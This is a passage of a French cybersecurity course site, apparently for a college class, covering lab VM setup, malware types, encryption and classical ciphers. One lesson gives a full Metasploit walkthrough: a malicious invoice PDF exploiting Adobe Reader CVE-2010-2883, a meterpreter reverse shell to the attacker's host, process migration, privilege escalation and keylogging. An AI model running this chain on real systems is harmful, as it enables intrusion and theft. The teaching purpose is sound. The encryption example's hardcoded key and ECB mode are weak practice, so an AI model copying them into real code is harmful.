postgresql</code></p>"},{"location":"labo/Installation_Metasploitable_VirtualBox/","title":"Installation de Metasploitable dans VirtualBox","text":"<p>T\u00e9l\u00e9charger le vmdk de Windows XP via la page de t\u00e9l\u00e9chargement :</p> <p>Page de t\u00e9l\u00e9chargement</p> <p>T\u00e9l\u00e9charger le ZIP. Extraire les fichiers du zip.</p> <p>Copier le fichier Metasploitable.vmdk dans votre dossier VirtualBox.</p> <p>Configurations de VirtualBox :</p> <p>General :</p> <p>Type : Linux</p> <p>Version : Debian (64-bit)</p> <p>Memory Size : 1024 MB</p> <p>Processor : 1 CPU</p> <p>Hard disk : Use an existing virtual hard disk file</p> <p>S\u00e9lectionner le fichier Metasploitable.vmdk.</p> <p>Une fois la machine virtuelle cr\u00e9\u00e9e :</p> <p>Display :</p> <p>Video Memory : 16 MB</p> <p>Scale Factor : 200%</p> <p>Graphics Controller : VMSVGA</p> <p>Network :</p> <p>Attached to : NAT Network</p> <p>Name : cegep</p> <p>D\u00e9marrer la VM. Metasploitable est install\u00e9 et fonctionnel.</p>"},{"location":"labo/Installation_MonMur_VirtualBox/","title":"Installation de MonMur dans VirtualBox","text":"<p>T\u00e9l\u00e9charger le OVA de MonMur via la page de t\u00e9l\u00e9chargement :</p> <p>Page de t\u00e9l\u00e9chargement</p> <p>Configurations de VirtualBox :</p> <p>Dans VirtualBox, aller dans le menu File -&gt; Import Appliance...</p> <p>S\u00e9lectionner le fichier monmur.ova et cliquer sur continuer.</p> <p>Cliquer sur importer.</p> <p>D\u00e9marrer la VM. MonMur est install\u00e9 et fonctionnel.</p> <p>Mots de passe :  </p> <p>OS : root/allo123 MySQL : root/cegep2020  </p>"},{"location":"labo/Installation_Snort_VirtualBox/","title":"Installation de Snort dans VirtualBox","text":"<p>T\u00e9l\u00e9charger le OVA de Snort via la page de t\u00e9l\u00e9chargement :</p> <p>Page de t\u00e9l\u00e9chargement</p> <p>Configurations de VirtualBox :</p> <p>Dans VirtualBox, aller dans le menu File -&gt; Import Appliance...</p> <p>S\u00e9lectionner le fichier snort.ova et cliquer sur continuer.</p> <p>Cliquer sur importer.</p> <p>D\u00e9marrer la VM. Snort est install\u00e9 et fonctionnel.</p> <p>user : root password : cegep2020  </p>"},{"location":"labo/Installation_WindowsXP_VirtualBox/","title":"Installation de Windows XP dans VirtualBox","text":"<p>T\u00e9l\u00e9charger le OVA de Windows XP via la page de t\u00e9l\u00e9chargement :</p> <p>Page de t\u00e9l\u00e9chargement</p> <p>Configurations de VirtualBox :</p> <p>Dans VirtualBox, aller dans le menu File -&gt; Import Appliance...</p> <p>S\u00e9lectionner le fichier winxp.ova et cliquer sur continuer.</p> <p>Cliquer sur importer.</p> <p>D\u00e9marrer la VM. Windows XP est install\u00e9 et fonctionnel.</p>"},{"location":"labo/capturer_trafic_virtualbox/","title":"Pour capturer le trafic d'une machine virtuelle dans VirtualBox","text":"<p>1- Dans le terminal, utiliser la commande suivante :</p> <p><code>VBoxManage modifyvm \"metasploitable\" --nictrace1 on --nictracefile1 /Users/etiennerivard/Documents/ftp.pcap</code></p> <p>2- D\u00e9marrer la VM avec la commande suivante :</p> <p><code>VirtualBoxVM -startvm metasploitable</code></p> <p>R\u00e9f\u00e9rences : https://www.virtualbox.org/wiki/Network_tips</p>"},{"location":"labo/installation_openvas/","title":"Installation d'OpenVAS (Greenbone)","text":"<p>L'installation se fait dans la VW de Kali Linux.  </p> <p>Mettre \u00e0 jour apt :  </p> <p><code>sudo apt update</code> </p> <p>Pour installer OpenVAS :</p> <p><code>sudo apt install openvas</code></p> <p>Pour la configuration initiale :</p> <p><code>sudo gvm-setup</code></p> <p>Warning</p> <p>Prenez bien soin de prendre en note le mot de passe g\u00e9n\u00e9r\u00e9 par <code>gvm-setup</code>. C'est essentiel pour se connecter au portail d'OpenVAS. . </p> <p>Pour d\u00e9marrer GVM :  </p> <p><code>sudo gvm-start</code></p> <p>Important</p> <p>Lors de la premi\u00e8re ex\u00e9cution, veuillez attendre 4 \u00e0 6 heures pour que la base de donn\u00e9es de GVM se g\u00e9n\u00e8re.    </p> <p>Ouvrir la console web :</p> <p>https://127.0.0.1:9392/</p> <p>Pour voir le status des \"feeds\" de OpenVas :  </p> <ol> <li>Administration </li> <li>Feed Status  </li> <li>Assurez-vous que le status est \u00e0 current.</li> </ol> <p> </p>"},{"location":"labo/kali_demarrer_bd_postgresql/","title":"D\u00e9marrer PostGreSQL","text":"<p>La base de donn\u00e9es PostGreSQL dans Kali est utilis\u00e9e par Metasploit Framework pour conserver les espaces de travail.</p> <p>Pour d\u00e9marrer la base de donn\u00e9es, ouvrir une fen\u00eatre de terminal et entrer la commande suivante :</p> <p><code>systemctl start postgresql</code></p> <p>Pour valider que la BD fonctionne dans MSF :</p> <p><code>msfconsole</code></p> <p><code>db_status</code></p>"},{"location":"lecons/Antivirus_et_PDF_malicieux/","title":"Antivirus et PDF malicieux","text":""},{"location":"lecons/Antivirus_et_PDF_malicieux/#antivirus","title":"Antivirus","text":"<p>Un antivirus est un logiciel qui d\u00e9tecte du code malicieux et l'emp\u00eache d'\u00eatre ex\u00e9cut\u00e9.</p> <p>L'approche traditionnelle d'un anti-virus est la d\u00e9tection via les signatures du virus.</p> <p>Si l'antivirus en est capable, il va d\u00e9truire le virus. S'il n'est pas capable de le d\u00e9truire, il va mettre en quarantaine le fichier contenant le virus.</p> <p>Une autre approche de certains antivirus est la d\u00e9tection par \u00e9v\u00e9nements louches. Quand un programme r\u00e9agit anormalement, l'antivirus peut lever une alerte. Ex: Ouvrir un PDF et le logiciel essaie d'\u00e9crire dans des r\u00e9pertoires syst\u00e8mes.</p>"},{"location":"lecons/Antivirus_et_PDF_malicieux/#antivirus-en-entreprise","title":"Antivirus en entreprise","text":"<p>En entreprise, vous aurez \u00e0 g\u00e9rer l'antivirus pour l'ensemble des actifs. Les solutions professionnelles aide avec une console install\u00e9e sur un serveur, qui permet de d\u00e9ployer l'antivirus, monitorer tous les postes et les mettre \u00e0 jour constamment.</p> <p>Ex: Trendmicro Apex One</p>"},{"location":"lecons/Antivirus_et_PDF_malicieux/#types-de-code-malicieux","title":"Types de code malicieux","text":""},{"location":"lecons/Antivirus_et_PDF_malicieux/#virus","title":"Virus","text":"<p>Un virus est du code qui se propage et peut causer du tord \u00e0 un ordinateur. Son mode de propagation est via des applications infect\u00e9es.</p>"},{"location":"lecons/Antivirus_et_PDF_malicieux/#ver-worm","title":"Ver (worm)","text":"<p>Un ver est du code malicieux qui se propage \u00e0 travers un r\u00e9seau via un service, tel que le partage de fichier de Windows.</p>"},{"location":"lecons/Antivirus_et_PDF_malicieux/#bombes-logiques-logic-bombs","title":"Bombes logiques (logic bombs)","text":"<p>Du code malicieux qui est inactif sur un syst\u00e8me et attend un \u00e9v\u00e9nement pour d\u00e9clencher une attaque, souvent pour d\u00e9truire des syst\u00e8mes ou des donn\u00e9es.</p>"},{"location":"lecons/Antivirus_et_PDF_malicieux/#cheval-de-troie-trojan-horse","title":"Cheval de Troie (Trojan horse)","text":"<p>Logiciel banal contenant du code malicieux. Souvent un logiciel gratuit (ou un jeu) que les victimes installent sans se rendre compte qu'ils installent un logiciel malveillant, comme un logiciel espion.</p>"},{"location":"lecons/Antivirus_et_PDF_malicieux/#rancongiciel-ransomware","title":"Ran\u00e7ongiciel (ransomware)","text":"<p>Logiciel qui crypte le poste de travail et demande un paiement pour d\u00e9crypter celui-ci.</p>"},{"location":"lecons/Antivirus_et_PDF_malicieux/#palmares","title":"Palmares","text":"<p>Voici les virus et vers les plus connus de tous les temps :</p> <ol> <li>CryptoLocker : Ce virus crypte les ordinateurs cibl\u00e9s et demande une ran\u00e7on pour d\u00e9crypter.</li> <li>ILOVEYOU : Transmis par courriel avec comme sujet I Love You. Les victimes ouvraient la pi\u00e8ce jointe, un fichier VBScript qui infectait le pc.</li> <li>MyDoom : Aussi transmis par courriel, en 2004 on estimait que 25% de tous les courriels envoy\u00e9s \u00e9taient infect\u00e9s par ce virus.</li> <li>Anna Kournikova : Transmis par courriel avec une fichier qui se faisait passer pour une photo de la joueuse de tennis. Les victimes ouvraient la pi\u00e8ce jointe, un fichier VBScript qui infectait le pc.</li> <li>Slammer : Un ver qui en 15 minute \u00e0 infect\u00e9 tellement de syst\u00e8mes que \u00e7a crash\u00e9 l'Internet.</li> <li>Stuxnet : Cr\u00e9\u00e9 par le gouvernement am\u00e9ricain, ce virus a \u00e9t\u00e9 cr\u00e9\u00e9 pour d\u00e9truire les centrifugeuses du programme nucl\u00e9aire d'Iran.</li> </ol>"},{"location":"lecons/Antivirus_et_PDF_malicieux/#attaque-du-client-avec-un-pdf-malicieux","title":"Attaque du client avec un PDF malicieux","text":"<p>Les pirates vont souvent combiner une attaque avec des \u00e9l\u00e9ments d'ing\u00e9nierie sociale. Si l'attaquant a des adresses de courriel valides, il peut cr\u00e9er un site web ou un fichier contenant du code malicieux pour prendre le contr\u00f4le de l'ordinateur de la victime.</p> <p>Ce document va faire la d\u00e9monstration d'une fa\u00e7on de faire facile pour cr\u00e9er un PDF malicieux \u00e0 l'aide de Metasploit.</p> <p>Pour r\u00e9ussir une attaque, il est important d'en savoir le plus possible sur notre cible. Dans le cadre de cette d\u00e9monstration, la cible est la VM Windows XP sur laquelle est install\u00e9e une version sp\u00e9cifique d'Adobe Reader (9.3.4).</p> <p>Pour commencer, il faut trouver une faille \u00e0 exploiter. Une simple recherche dans Google me donne ce site qui explique quel CVE correspond \u00e0 la version d'Adobe qui est cibl\u00e9e.</p> <p>CVE for Adobe Reader 9.3.4</p> <p>On peut voir le CVE 2010-2883.</p> <p>Faison une recherche dans Metasploit :</p> <p><code>search cve:2010-2883</code></p> <p>\u00c7a donne le module : exploit/windows/fileformat/adobe_cooltype_sing</p> <p>Ce module permet de cr\u00e9er un PDF qui permet d'ex\u00e9cuter du code d\u00fb \u00e0 un bogue de d\u00e9passement de cache.</p> <p>Utilisons donc ce module :</p> <p><code>use exploit/windows/fileformat/adobe_cooltype_sing</code></p> <p>Il faut donner un nom \u00e0 notre PDF. Disons que c'est une facture :</p> <p><code>set FILENAME /tmp/facture.pdf</code></p> <p>Cherchons un payload \u00e0 ins\u00e9rer dans le PDF. Dans notre sc\u00e9nario, nous voulons prendre le contr\u00f4le du syst\u00e8me de la victime avec Meterpreter.</p> <p><code>search type:payload platform:windows meterpreter</code></p> <p>Un des modules \u00e0 l'air int\u00e9ressant : payload/windows/meterpreter/reverse_tcp. Avec ce module, le syst\u00e8me de la victime essaiera de se connecter \u00e0 notre Kali via TCP lors de l'ouverture du PDF.</p> <p><code>set PAYLOAD windows/meterpreter/reverse_tcp</code></p> <p>Ce module a quelques param\u00e8tres :</p> <p>L'adresse du serveur de commande (notre Kali) :</p> <p><code>set LHOST 192.168.40.4</code></p> <p>Le port d'\u00e9coute :</p> <p><code>set LPORT 4455</code></p> <p>Une fois configur\u00e9, cr\u00e9ons le PDF :</p> <p><code>exploit</code></p> <p>Avant d'envoyer le PDF \u00e0 notre victime (dans ce cas-ci, on le copie sur la VM de Windows XP), il faut ouvrir l'\u00e9coute sur le port 4455.</p> <p><code>use exploit/multi/handler</code></p> <p><code>set PAYLOAD payload/windows/meterpreter/reverse_tcp</code></p> <p><code>set LPORT 4455</code></p> <p><code>set LHOST 192.168.40.4</code></p> <p><code>exploit</code></p> <p>Le syst\u00e8me attend une connexion de la victime.</p> <p>Quand la victime ouvre le PDF, notre syst\u00e8me affiche ceci, nous sommes dans le syst\u00e8me :</p> <p></p> <p>C'est le moment d'agir vite. Pour la victime, Adobe Reader semble gel\u00e9. C'est que Meterpreter roule dans le processus d'Adobe Reader. Il faut rapidement migrer vers un autre processus syst\u00e8me pour \u00e9viter que la victime termine le processus.</p> <p>Regardons les processus actifs :</p> <p><code>ps</code></p> <p>Important de prendre un processus qui est l\u00e0 en permanence sous le nom de l'utilisateur.</p> <p><code>migrate -P 1216</code></p> <p>Une fois la commande termin\u00e9e, Adobe Reader peut \u00eatre ferm\u00e9, nous resterons actifs.</p> <p>Pour avoir les droits administrateurs de la machine :</p> <p><code>getsystem</code></p> <p>Si nous voulons copier tout ce qui est \u00e9crit au clavier :</p> <p><code>keyscan_start</code></p> <p>Pour voir ce qui a \u00e9t\u00e9 captur\u00e9 :</p> <p><code>keyscan_dump</code></p>"},{"location":"lecons/Antivirus_et_PDF_malicieux/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur les antivirus et pdf malicieux </p>"},{"location":"lecons/Attaque_Uber/","title":"Comment l'attaque de Uber en 2022 s'est d\u00e9roul\u00e9e","text":""},{"location":"lecons/CacherCodeMalicieux/","title":"Cacher du code malicieux","text":""},{"location":"lecons/CacherCodeMalicieux/#cacher-du-code-malicieux","title":"Cacher du code malicieux","text":"<p>Deux chercheurs ont trouv\u00e9 une fa\u00e7on de cacher du code malicieux en pleine vue des programmeurs.  </p> <p>C'est en utilisant des caract\u00e8res UNICODE qui controllent normalement l'\u00e9criture droite-\u00e0-gauche pour les langues telles que l'Arabe.  </p> <p>Voici le code dans Visual Studio Code : </p> <p>Voici le r\u00e9sultat du code ex\u00e9cut\u00e9 :  </p> <p></p> <p>Voici le code si on l'affiche avec un \u00e9diteur qui ne supporte pas totalement UNICODE :  </p> <p> </p> <p>Pour plus d'information, consulter le site Trojan Source </p>"},{"location":"lecons/Chiffrement_et_donnees_sensibles/","title":"Chiffrement et donn\u00e9es sensibles","text":""},{"location":"lecons/Chiffrement_et_donnees_sensibles/#pourquoi-chiffrer","title":"Pourquoi chiffrer","text":"<p>Le chiffrement des donn\u00e9es est essentiel pour les prot\u00e9ger contre la consultation non autoris\u00e9e et contre toute forme de manipulation.  </p>"},{"location":"lecons/Chiffrement_et_donnees_sensibles/#quoi-chiffrer","title":"Quoi chiffrer","text":"<p>Voici quelques types de donn\u00e9es qui doivent \u00eatre chiffr\u00e9es :  </p> <ul> <li>Donn\u00e9es personnelles permettant d'identifier un individu (NAS, Adresse, Date de naissance, Num\u00e9ro de permis, Num\u00e9ro de passeport, etc.)  </li> <li>Donn\u00e9es m\u00e9dicales (Probl\u00e8mes de sant\u00e9, conditions m\u00e9dicales, interventions, groupe sanguin, etc.)  </li> <li>Donn\u00e9es bancaires (Cartes de cr\u00e9dit, comptes de banque)  </li> <li>Mots de passe  </li> <li>Information privil\u00e9gi\u00e9e d'entreprise (Recettes, propri\u00e9t\u00e9 intellectuelle)  </li> </ul>"},{"location":"lecons/Chiffrement_et_donnees_sensibles/#quand-chiffrer","title":"Quand chiffrer","text":"<p>Pour prot\u00e9ger ad\u00e9quatement les donn\u00e9es, il est recommand\u00e9 de chiffrer les donn\u00e9es au repos et en transit.  </p> <p>Au repos : les donn\u00e9es qui sont entrepos\u00e9es dans la base de donn\u00e9es. Utile pour se prot\u00e9ger contre le vol de la base de donn\u00e9es par un pirate qui a obtenu acc\u00e8s \u00e0 la base de donn\u00e9es.  </p> <p>En transit : Chiffrer les communications entre le serveur et le client. Utile pour se prot\u00e9ger contre l'\u00e9coute des communications par un pirate.  </p>"},{"location":"lecons/Chiffrement_et_donnees_sensibles/#comment-chiffrer","title":"Comment chiffrer","text":"<p>Diff\u00e9rentes techniques de chiffrement existent et il faut choisir la bonne selon la situation.  </p> <p>Trois grandes cat\u00e9gories :  </p> Cat\u00e9gorie Cl\u00e9 Utilisation Chiffrement sym\u00e9trique M\u00eame cl\u00e9 pour chiffrer et d\u00e9chiffrer Utile lorsqu'il y a peu d'intervenants. Chiffrement asym\u00e9trique Une cl\u00e9 pour chiffrer, une autre pour d\u00e9chiffrer R\u00e9duit la complexit\u00e9 lorsqu'il y a beaucoup d'intervenants. Hashing Chiffrement sans d\u00e9chiffrement possible Utile pour conserver les mots de passe <p>Prenons comme exemple un site Web contenant des donn\u00e9es sensibles.  Ce site n\u00e9cessite un code utilisateur avec mot de passe.</p> <p>Il y a 3 endroits o\u00f9 le chiffrement sera utilis\u00e9 :</p> <p>1- Lors de l'envoi du mot de passe, le site utilisera le hashing. 2- Lors de la sauvegarde des donn\u00e9es sensibles et lors des lectures subs\u00e9quentes, le module d'acc\u00e8s \u00e0 la base de donn\u00e9es utilisera un chiffrement sym\u00e9trique car le module est le seul \u00e0 poss\u00e9der le mot de passe. (Donn\u00e9es au repos) 3- Lors de la transmission des donn\u00e9es entre le serveur et le client, il y aura un chiffrement asym\u00e9trique initial suivi d'une transmission avec un chiffrement sym\u00e9trique. (Protocole HTTPS)  </p> <p>Important</p> <p>Lorsque vous utilisez des cl\u00e9s de chiffrement dans votre code, il est important de ne pas laisser en texte clair les cl\u00e9s dans votre git. </p>"},{"location":"lecons/Chiffrement_et_donnees_sensibles/#chiffrement-du-mot-de-passe","title":"Chiffrement du mot de passe","text":"<p>Une m\u00e9thode simple pour chiffrer le mot de passe en PHP est l'utilisation de la fonction <code>password_hash()</code>.  Dans notre application, la fonction sera utilis\u00e9e lors de l'\u00e9criture du mot de passe :</p> <pre><code>function creerCompte($code_utilisateur, $mot_de_passe){\n  $conn = creerConnexion();\n  $requete = $conn-&gt;prepare(\"INSERT INTO utilisateurs (codeutilisateur, motdepasse) VALUES(?, ?)\");\n  $mot_de_passe_chiffre = password_hash($mot_de_passe, PASSWORD_DEFAULT);\n  $requete-&gt;bind_param('ss', $code_utilisateur, $mot_de_passe_chiffre);\n  return $requete-&gt;execute();\n}\n</code></pre> <p>Lorsqu'un compte est cr\u00e9\u00e9, le mot de passe est maintenant chiffr\u00e9 dans la base de donn\u00e9es.</p> <p>Table utilisateurs</p> <p> Notez que Carole et Julien ont le m\u00eame mot de passe, mais la fonction g\u00e9n\u00e8re un hash diff\u00e9rent.  </p> <p>Il faut aussi changer la mani\u00e8re de v\u00e9rifier si l'utilisateur a le bon mot de passe, en utilisant la fonction <code>password_verify()</code> :  </p> <pre><code>function authentifier($code_utilisateur, $mot_de_passe){\n  $conn = creerConnexion();\n  $requete = $conn-&gt;prepare(\"SELECT motdepasse FROM utilisateurs WHERE codeutilisateur = ?\");\n  $requete-&gt;bind_param('s', $code_utilisateur);\n  $requete-&gt;execute();\n  $resultats = $requete-&gt;get_result();\n  $utilisateur = $resultats-&gt;fetch_assoc();\n  return password_verify($mot_de_passe, $utilisateur['motdepasse']);\n}\n</code></pre>"},{"location":"lecons/Chiffrement_et_donnees_sensibles/#chiffrer-les-donnees-confidentielles","title":"Chiffrer les donn\u00e9es confidentielles","text":"<p>Disons que nous voulons chiffrer les commentaires des utilisateurs dans notre base de donn\u00e9es. Nous utiliserons une chiffrement sym\u00e9trique. En PHP, nous pouvons utiliser OpenSSL pour g\u00e9rer le chiffrement, avec <code>openssl_encrypt()</code> et <code>openssl_decrypt()</code>.</p> <p>Tout d'abord la cr\u00e9ation de la cl\u00e9 de chiffrement dans notre fichier <code>secret.php</code> :</p> <pre><code>&amp;lt;?php\ndefine('CLE_CHIFFREMENT', \"Latina-Marble-Honda-Speaks-Atomic-Majority-RTnL\");\n?&gt;\n</code></pre> <p>Pour l'enregistrement d'un commentaire :  </p> <pre><code>function enregistrerCommentaire($commentaire, $nom_image, $code_utilisateur){\n  $conn = creerConnexion();\n  $requete = $conn-&gt;prepare(\"INSERT INTO monmur (commentaire, image, codeutilisateur) VALUES(?, ?, ?)\");\n\n  $commentaire = addslashes($commentaire);\n  $commentaire = substr($commentaire, 0, 1000);\n  $commentaire_chiffre = openssl_encrypt($commentaire, \"AES-128-ECB\", CLE_CHIFFREMENT);\n  $requete-&gt;bind_param('sss', $commentaire_chiffre, $nom_image, $code_utilisateur);\n\n  if(!$requete-&gt;execute()) {\n    die(\"Erreur insertion : \" . $conn-&gt;error);\n  }\n}\n</code></pre> <p>Pour le d\u00e9chiffrement d'un commentaire :  </p> <pre><code>function dechiffrerCommentaire($commentaire_chiffre) {\n  return openssl_decrypt($commentaire_chiffre, \"AES-128-ECB\", CLE_CHIFFREMENT);\n}\n</code></pre>"},{"location":"lecons/Chiffrement_et_donnees_sensibles/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur le chiffrement et donn\u00e9es sensibles </p>"},{"location":"lecons/Cryptographie/","title":"Cryptographie","text":"<p>En s\u00e9curit\u00e9, la cryptographie apporte de la confidentialit\u00e9, de l'int\u00e9grit\u00e9 et de l'authentification pour l'information au repos et en transit.</p> <p>C'est pour prot\u00e9ger l'information d'une utilisation et d'une visualisation non autoris\u00e9e.</p>"},{"location":"lecons/Cryptographie/#le-chiffrement-de-cesar","title":"Le chiffrement de C\u00e9sar","text":"<p>Pour prot\u00e9ger les communications entre Rome et ses forces en Europe, C\u00e9sar utilisait un syst\u00e8me cryptographique. Pour chiffrer un message, il remplacait chaque lettre du message par une lettre \u00e0 droite de 3. Par exemple, A devenait D, B devenait E et Z devenait C. Aujourd'hui, c'est connu sous le nom de ROT3 (Rotate 3).  </p> <p>Le texte suivant :</p> <p>Bonjour la gang</p> <p>Devenait :</p> <p>Erqmrxu od jdqj</p> <p>Pour d\u00e9chiffrer un message de C\u00e9sar, il faut faire l'op\u00e9ration inverse, soit remplacer chaque lettre par celle \u00e0 gauche de 3.</p> <p>Exemple :  </p> <p>MRHO</p> <p>M - 3(LKJ) = J R - 3(QPO) = O H - 3(GFE) = E O - 3(NML) = L  </p>"},{"location":"lecons/Cryptographie/#cracker-un-message-de-cesar","title":"Cracker un message de C\u00e9sar","text":"<p>Les experts en cryptographie utilisent les statistiques de fr\u00e9quence d'occurence des lettres pour d\u00e9terminer quel serait le d\u00e9calage de chaque lettre. </p> <p>Voici les statistiques de fr\u00e9quence d'occurence des lettres en fran\u00e7ais :</p> <p></p> <p>Source</p> <p>Vous pouvez voir que la lettre E est la plus fr\u00e9quente dans un texte en fran\u00e7ais.  </p> <p>Lorsque le texte est chiffr\u00e9, ce ne sera pas la lettre E qui sera la plus fr\u00e9quente. Alors, pour d\u00e9chiffrer le message, il faut trouver le d\u00e9calage de la lettre E. Si la lettre la plus fr\u00e9quente est le I, le d\u00e9calage serait pobablement de 4. </p> <p>Prenons un exemple d'un texte chiffr\u00e9 :  </p> <p>\"xqe xagfdqe (xgfduzmq) eazf gzq eagermyuxxq pq ymyyurqdqe omdzuhadqe pq xm rmyuxxq pqe ygefqxupqe. ux qjuefq bxgeuqgde qebqoqe pq xagfdqe, omdmofqdueqqe bmd pq oagdfqe bmffqe, pqe pausfe sdurrge qf bmxyqe (mgj bmffqe mhmzf qf mdduqdq) qf gzq xazsgq cgqgq.</p> <p>oqffq eagermyuxxq m qfq pqodufq bagd xm bdqyuqdq raue qz  bmd xq laaxasuefq otmdxqexgouqz nazmbmdfq.</p> <p>pmze pq zayndqgj bmke, xqe xagfdqe azf puebmdg pq fagf ag bmdfuq pq xqgd mudq zmfgdqxxq pq dqbmdfufuaz, pq yqyq cgq xqe omefade cgu bmdfmsqmuqzf xqgd yuxuqg pq huq. oqe pqgj qebqoqeoxq razf x'anvqf pqbgue gz euqoxq qzhudaz pq bdafqofuaz qf pq bdasdmyyqe ag bdavqfe pq dquzfdapgofuaz ag oazradfqyqzf pq babgxmfuaze bmd fdmzexaomfuaz. xm xagfdq qfmzf bmdfuogxuqdqyqzf pueodqfq qxxq rmuf eaghqzf x'anvqf p'gz eguhu bmd dqotqdotq p'uzpuoq (bauxe, ymdcgmsq pq fqddufaudq, buqsqe btafasdmbtucgqe) qf p'gz eguhu fqxqyqfducgq bmd bgoq qxqofdazucgq\"</p> <p>Voici les statistiques de fr\u00e9quence pour ce texte :  </p> <p> </p> <p>Outil pour calculer rapidement la fr\u00e9quence des lettres </p> <p>Outil pour d\u00e9chiffrer un texte de C\u00e9sar</p> <p>La lettre la plus fr\u00e9quente dans ce texte est la lettre Q. Nous pouvons supposer que le texte a \u00e9t\u00e9 chiffr\u00e9 avec un d\u00e9calage de 12 (Q - E = 12).</p> <p>Note</p> <p>-12 est pour d\u00e9chiffrer. Plusieurs outils ont un choix de chiffrement entre ROT1 et ROT25. Alors le -12 serait le ROT14 (26-12).</p> <p>Voici le texte lorsqu'on le d\u00e9chiffre avec -12 :  </p> <p>\"les loutres (lutrinae) sont une sousfamille de mammiferes carnivores de la famille des mustelides. il existe plusieurs especes de loutres, caracterisees par de courtes pattes, des doigts griffus et palmes (aux pattes avant et arriere) et une longue queue.</p> <p>cette sousfamille a ete decrite pour la premiere fois en  par le zoologiste charleslucien bonaparte.</p> <p>dans de nombreux pays, les loutres ont disparu de tout ou partie de leur aire naturelle de repartition, de meme que les castors qui partageaient leur milieu de vie. ces deux especescle font l'objet depuis un siecle environ de protection et de programmes ou projets de reintroduction ou confortement de populations par translocation. la loutre etant particulierement discrete elle fait souvent l'objet d'un suivi par recherche d'indice (poils, marquage de territoire, pieges photographiques) et d'un suivi telemetrique par puce electronique\"  </p>"},{"location":"lecons/Cryptographie/#bases-de-la-cryptographie","title":"Bases de la cryptographie","text":"<p>Un syst\u00e8me de chiffrement sym\u00e9trique est fait en sorte que la cl\u00e9 de chiffrement est la m\u00eame cl\u00e9 pour le d\u00e9chiffrement.</p> <p>Un syst\u00e8me de chiffrement asym\u00e9trique utilise une cl\u00e9 pour le chiffrement et une autre pour le d\u00e9chiffrement. Ce sont deux cl\u00e9s diff\u00e9rentes et il est impossible de d\u00e9chiffrer avec la cl\u00e9 de chiffrement.</p> <p>plain-texte : Texte lisible par l'humain avant d'\u00eatre chiffr\u00e9 (repr\u00e9sent\u00e9 par un P)</p> <p>chiffre-texte : Texte chiffr\u00e9 par un algorithme de chiffrement (repr\u00e9sent\u00e9 par un C)</p>"},{"location":"lecons/Cryptographie/#chiffrement-symetrique","title":"Chiffrement sym\u00e9trique","text":"<p>Le chiffrement sym\u00e9trique implique que la cl\u00e9 secr\u00e8te est partag\u00e9e entre l'\u00e9metteur et le r\u00e9cipiendaire d'un message.</p> <p>C'est bon pour la confidentialit\u00e9, mais \u00e7a ne prouve pas l'identit\u00e9 de l'\u00e9metteur du message, car la cl\u00e9 secr\u00e8te est connue d'au moins 2 personnes.</p> <p>La distribution de la cl\u00e9 est un probl\u00e8me. Il faut avoir un canal de distribution de la cl\u00e9 s\u00e9curitaire pour la transmettre sans risquer de se la faire intercepter. (Ne jamais envoyer une cl\u00e9 secr\u00e8te par courriel, par exemple)</p> <p>La cl\u00e9 doit \u00eatre r\u00e9g\u00e9n\u00e9r\u00e9e souvent. En effet, lorsqu'un membre du groupe qui poss\u00e8de la cl\u00e9 quitte, la cl\u00e9 ne peut plus \u00eatre utilis\u00e9e.</p>"},{"location":"lecons/Cryptographie/#chiffrement-asymetrique","title":"Chiffrement asym\u00e9trique","text":"<p>Le chiffrement asym\u00e9trique est aussi appel\u00e9 chiffrement \u00e0 cl\u00e9 publique. L'algorithme utilise une paire de cl\u00e9s, une priv\u00e9e et seulement connue du r\u00e9cipiendaire et l'autre publique, connue de tous.</p> <p></p> <p>Le chiffrement aide :</p> Aspect Impact Confidentialit\u00e9 La communication ne peut \u00eatre consult\u00e9e sans la cl\u00e9 Int\u00e9grit\u00e9 Avec une fonction cryptographique de hashage, on peut v\u00e9rifier l'int\u00e9grit\u00e9 des donn\u00e9es transmises Authentication Un syst\u00e8me demande \u00e0 un client de chiffrer un message sp\u00e9cifique. Le message chiffr\u00e9 est la preuve que le client poss\u00e8de la bonne cl\u00e9"},{"location":"lecons/Cryptographie/#chiffrement-par-transposition","title":"Chiffrement par transposition","text":"<p>Le chiffrement par transposition r\u00e9arrange les lettres d'un plain-texte. Par exemple, on pourrait simplement renverser l'ordre des lettres :</p> <p>POMME deviendrait EMMOP</p> <p>La transposition par colonnes prend une cl\u00e9 et calcule la position de chaque lettre en ordre alphab\u00e9tique. Si une lettre revient deux fois, la seconde prend la position suivante. Ex :</p> <pre><code>P A T A T E\n 4 1 5 2 6 3\n</code></pre> <p>Pour chiffrer le plain-texte suivant :</p> <p><code>LE MOT DE PASSE EST CHEVAL123</code></p> <p>Il faut l'\u00e9crire dans les colonnes comme suit :</p> <pre><code>P A T A T E\n 4 1 5 2 6 3\n L E M O T D\n E P A S S E\n E S T C H E\n V A L 1 2 3\n</code></pre> <p>Ensuite, il faut \u00e9crire le chiffre-texte selon l'ordre des colonnes :</p> <p><code>E P S A O S C 1 D E E 3 L E E V M A T L T S H 2</code></p> <p>Pour d\u00e9chiffrer un message par transposition, il faut tout d'abord diviser le nombre de caract\u00e8res dans le chiffre-texte par la longueur de la cl\u00e9.</p> <p>Ex: Le chiffre-texte suivant : TTEPAHAEUREQIGI  et la cl\u00e9 FROID  </p> <p>Le plain-texte a 15 caract\u00e8res et la cl\u00e9 5 caract\u00e8res.</p> <p>Il faut faire une grille comme suit :  </p> F R O I D <p>Ensuite, remplir chaque colonne de la grille avec les caract\u00e8res du chiffre-texte, en commen\u00e7ant avec la premi\u00e8re position (le D de FROID) :  </p> <p>TTEPAHAEUREQIGI</p> F R O I D T T E <p>La seconde colonne (le F) :  </p> <p>TTEPAHAEUREQIGI  </p> F R O I D P T A T H E <p>La troisi\u00e8me colonne (le I) :   </p> <p>TTEPAHAEUREQIGI  </p> F R O I D P A T A E T H U E <p>La quatri\u00e8me colonne (le O) :   </p> <p>TTEPAHAEUREQIGI  </p> F R O I D P R A T A E E T H Q U E <p>La derni\u00e8re colonne (le R) :  </p> <p>TTEPAHAEUREQIGI </p> F R O I D P I R A T A G E E T H I Q U E <p>Lire le message par ligne :  </p> <p>PIRAT AGEET HIQUE  </p> <p>PIRATAGEETHIQUE  </p>"},{"location":"lecons/Cryptographie/#chiffrement-par-substitution","title":"Chiffrement par substitution","text":"<p>Le chiffrement de Vigen\u00e8re est un chiffrement par substitution polyalphab\u00e9tique. Il utilise une charte de chiffrement et de d\u00e9chiffrement d\u00e9montr\u00e9 ici :  </p> <p> </p> <p>Pour chiffrer, il faut utiliser une 